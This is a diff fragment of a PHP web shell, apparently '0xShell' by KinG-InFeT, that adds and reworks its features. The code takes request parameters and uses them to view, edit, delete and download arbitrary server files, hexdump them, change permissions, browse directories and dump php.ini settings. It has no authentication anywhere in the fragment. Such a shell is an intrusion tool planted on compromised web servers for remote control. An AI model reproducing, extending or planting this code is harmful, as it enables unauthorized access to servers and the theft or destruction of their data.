+		if(check_extenction($view_file) == "php")
+			print highlight_file($view_file) ."\n";
+		else
+			print "<pre>".file_get_contents($view_file)."</pre>\n";
+			
+		print "</div>\n";
 	}
 }
 
@@ -624,11 +807,12 @@ if(isset($edit_file)) {  //editing file :D
 		
 	$text = htmlspecialchars(join(file($edit_file)));
 
-	echo "<center>";
-	echo "<form method=\"POST\" action=\"$file?edit_file=$edit_file&work=yes \">";
-	echo "<textarea rows=\"30\" cols=\"150\" name=\"text\">$text</textarea>";
-	echo "<br><input type=\"submit\" value=\"Edit File\">";
-	echo "</form></center>";
+	print "<center>";
+	print "<form method=\"POST\" action=\"".$file."?edit_file=".$edit_file."&work=yes \">";
+	print "<textarea rows=\"30\" cols=\"150\" name=\"text\">".$text."</textarea>";
+	print "<br /><input type=\"submit\" value=\"Edit File\">";
+	print "</form></center>";
+	
 	if(@$_GET['work'] == 'yes') {
 		if(file_exists($edit_file)) {
 			$edit     = fopen($edit_file,'w+');
@@ -645,68 +829,207 @@ if(isset($rmdir)) {  //delete directory
 	if(del_dir($rmdir) == TRUE)
 		die("<script>alert('Directory Deleted'); window.location=\"".$patch."\";</script>");
 	else
-		die("<script>alert('Directory Created'); window.location=\"".$patch."\";</script>");
+		die("<script>alert('[ERROR] Directory not Deleted'); window.location=\"".$patch."\";</script>");
+}
+
+if(isset($down_file)) {  //Download File
+	if(file_exists($down_file)) {
+		@ob_clean();
+		header("Content-type: application/octet-stream");
+		header("Content-length: ".filesize($down_file));
+		header("Content-disposition: attachment; filename=\"".$down_file."\";");
+		print file_get_contents($down_file);
+		exit;
+	}else
+		print "File Not Exists!";
+}
+
+if(isSet($hexdump)) {
+	
+	if(empty($_GET['hexdump_file']))
+		die("[ERROR] File name not inserit!");
+	
+	if(!file_exists($_GET['hexdump_file']))
+		die("[ERROR] File not exists!");
+	
+	$f = $_GET['hexdump_file'];
+
+	$fi = fopen($f,"rb");
+	if ($fi) {
+		print "<b>HEXDUMP</b>"; 
+		$str = fread($fi,filesize($f));
+		$n  = 0;
+		$a0 = "00000000<br />";
+		$a1 = "";
+		$a2 = "";
+		
+		for ($i=0; $i<strlen($str); $i++) {
+			$a1 .= sprintf("%02X",ord($str[$i]))." ";
+			switch (ord($str[$i])) {
+				case  0:  
+					$a2 .= "<font>0</font>"; 
+				break;
+				
+				case 32:
+				
+				case 10:
+				
+				case 13: 
+					$a2 .= "&nbsp;"; 
+				break;
+				
+				default: 
+					$a2 .= htmlspecialchars($str[$i]);
+			}
+			$n++;
+			if ($n == 24) {
+				$n = 0;
+				
+				if ($i+1 < strlen($str))
+					$a0 .= sprintf("%08X",$i+1)."<br />";
+	
+				$a1 .= "<br />";
+				$a2 .= "<br />";
+			}
+		}
+		print "<table border=1 bgcolor=#666666>".
+		  	  "<tr>".
+			  "<td bgcolor=#666666>".$a0."</td>".
+			  "<td bgcolor=#000000>".$a1."</td>".
+			  "<td bgcolor=#000000>".$a2."</td>".
+			  "</tr>".
+			  "</table><br />";
+	}	
+}
+
+function my_wordwrap($str) {
+	$str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
+	return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
+}
+
+function check_value($value) {
+    if ($value == '') 
+		return '<i>no value</i>';
+	
+    if (@is_bool($value)) 
+		return $value ? 'TRUE' : 'FALSE';
+	
+    if ($value === null) 
+		return 'NULL';
+	
+    if (@is_object($value)) 
+		$value = (array) $value;
+		
+	if (@is_array($value)) {
+		@ob_start();
+		print_r($value);
+		$value = @ob_get_contents();
+		@ob_end_clean();
+    }
+	
+    return my_wordwrap((string) $value);
+}
+
+//visualizza tutte le variabili del file php.ini
+function get_phpini() {
+	if (@function_exists('ini_get_all')) {
+		$r = "";
+		print "<table><tr><td><div align=center>Directive</div></td><td><div align=center>Local Value</div></td><td><div align=center>Global Value</div></td></tr>";
+		print "<tr><td><hr /></td><td><hr /></td><td><hr /></td></tr>";
+		foreach (@ini_get_all() as $key=>$value) {
+			$r .= "<tr><td>".$key."</td><td><div align=center>".check_value($value['local_value'])."</div></td><td><div align=center>".check_value($value['global_value'])."</div></td></tr>";
+		}
+		
+		print $r;
+		print "</table>";
+		print "<br /><br /><br /><br />";
+	}else
+		print "[ERROR] <i>ini_get_all</i> NOT ACTIVE!";
+}
+
+function view_size($size) {	//Visualizza La grandezza di un file
+	if (!is_numeric($size))
+		return "[Error]";
+	else {
+		if ($size >= 1073741824)
+			$size = round($size/1073741824*100)/100 ." GB";
+		else
+			if ($size >= 1048576)
+				$size = round($size/1048576*100)/100 ." MB";
+		else
+			if ($size >= 1024)
+				$size = round($size/1024*100)/100 ." KB";
+		else 
+			$size = $size . " B";
+			
+		return $size;
+	}
 }
 ?>
 </div>
 </div>
 <table>
 <tr><td>File/Directory</td>
-<td>Remove?</td>
-<td>View?</td>
-<td>Edit?</td>
-<td>Permess</td></tr>
+<td>Size</td>
+<td>Permess</td>
+<td>Action</td>
+</tr>
 <tr><td><hr></td>
 <td><hr></td>
 <td><hr></td>
 <td><hr></td>
 <td><hr></td></tr>
 <?php
-if(isset($dir)) 
+if(isset($dir)) {
 	chdir($dir);
-echo "<tr><td><a href=\"".$patch."?dir=".htmlspecialchars($_GET['dir'])."/..\">..</a></td></tr>\n";
+}
+
+print "<tr><td><a href=\"".$patch."?dir=".htmlspecialchars(@$_GET['dir'])."/..\">..</a></td></tr>\n";
+
 foreach (glob("*") as $file) {
 	$perms_unix = get_perms($file,1);
 	$perms_num  = get_perms($file,2);
 
 	if(is_file($file)) {
 		if(isset($dir)) {
-   			echo "<tr><td><a href=".$dir."/".$patchs.">".$file."</a></td>\n";
-			echo "<td><a href=".$patch."?remove_file=".$dir."/".$file.">Remove</a></td>\n";
-			echo "<td><a href=".$patch."?view_file=".$dir."/".$file.">View</a></td>\n";
-			echo "<td><a href=".$patch."?edit_file=".$dir."/".$file.">Edit</a></td>\n";
-			echo "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." /~/ ".$perms_num."</a></u></td></tr>\n";
+   			print "<tr><td><a href=\"".$patch."?view_file=".$dir."/".$file."\">".$file."</a></td>\n"
+				. "<td>".view_size(@filesize($file))."</td>\n"
+				. "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
+				. "<td><a href=\"".$patch."?edit_file=".$dir."/".$file."\">Edit</a> - <a href=\"".$patch."?remove_file=".$dir."/".$file."\">Del</a> - <a href=\"".$patch."?download_file=".$dir."/".$file."\">Down</a> - <a href=\"".$patch."?hexdump_file=".$file."\">HEXDUMP</a></td>\n"
+				. "</tr>\n";
 		}else{
-			echo "<tr><td><a href=".$file.">".$file."</a></td>\n";
-			echo "<td><a href=".$patch."?remove_file=".$file.">Remove</a></td>\n";
-			echo "<td><a href=".$patch."?view_file=".$file.">View</a></td>\n";
-			echo "<td><a href=".$patch."?edit_file=".$file.">Edit</a></td>\n";
-			echo "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." /~/ ".$perms_num."</a></u></td></tr>\n";
+   			print "<tr><td><a href=\"".$patch."?view_file=".$file."\">".$file."</a></td>\n"
+				. "<td>".view_size(filesize($file))."</td>\n"
+				. "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
+				. "<td><a href=\"".$patch."?edit_file=".$file."\">Edit</a> - <a href=\"".$patch."?remove_file=".$file."\">Del</a> - <a href=\"".$patch."?download_file=".$file."\">Down</a> - <a href=\"".$patch."?hexdump_file=".$file."\">HEXDUMP</a></td>\n"
+				. "</tr>\n";
 		}
 	}
 
 	if(is_dir($file)) {
 		if(isset($dir)) {
-			echo "<tr><td><a href=".$file.">".$file."</td>\n";
-			echo "<td><a href=".$patch."?rmdir=".$dir."/".$file.">Remove</a></td>\n";
-			echo "<td><a href=".$patch."?dir=".$dir."/".$file."><u>DIR</u></td><td>Directory</td>\n";
-			echo "<td>".$perms_unix." /~/ ".$perms_num."</td></tr>\n";
+			print "<tr><td><a href=\"".$patch."?dir=".$dir."/".$file."\">[ ".$file." ]</td>\n"
+				. "<td>DIR</td>\n"
+				. "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
+				. "<td><a href=\"".$patch."?rmdir=".$dir."/".$file."\">Del</a>\n"
+				. "</tr>\n";
 		}else{
-			echo "<tr><td><a href=".$file.">".$file."</a></td>\n";
-			echo "<td><a href=".$patch."?rmdir=".$file.">Remove</a></td>\n";
-			echo "<td><a href=".$patch."?dir=".$file."><u>DIR</u></td><td>Directory</td>\n";
-			echo "<td>".$perms_unix." /~/ ".$perms_num."</td></tr>\n";
+			print "<tr><td><a href=\"".$patch."?dir=".$file."\">[ ".$file." ]</td>\n"
+				. "<td>DIR</td>\n"
+				. "<td><u><a href=\"?action=chmod&file=".$file."&perms=".$perms_num."\">".$perms_unix." - ".$perms_num."</a></u></td>\n"
+				. "<td><a href=\"".$patch."?rmdir=".$file."\">Del</a>\n"
+				. "</tr>\n";
 		}
 	}
 }
-   echo "</table>";
+   print "</table>";
    ?>
    <br />
    <table>
    <tr>
 <td valign='top'>
 <center>
-<b><font size='1'>[ ~ Powered by <a href='http://www.kinginfet.net/'><i>KinG-InFeT</i></a> && <a href="http://netw0rksecurity.net/"><i>Netw0rkSecurity Team</i></a> - <a href="http://0xproject.hellospace.net/#0xShell"><u>0xShell</u></a> v<?php echo VERSION; ?> ~ ]</b>
+<b><font size='1'>[ ~ Powered by <a href='http://www.kinginfet.net/'><i>KinG-InFeT</i></a> - <a href="http://0xproject.hellospace.net/#0xShell"><u>0xShell</u></a> v<?php print VERSION; ?> ~ ]</b>
 </font>
 </center>
 </td>
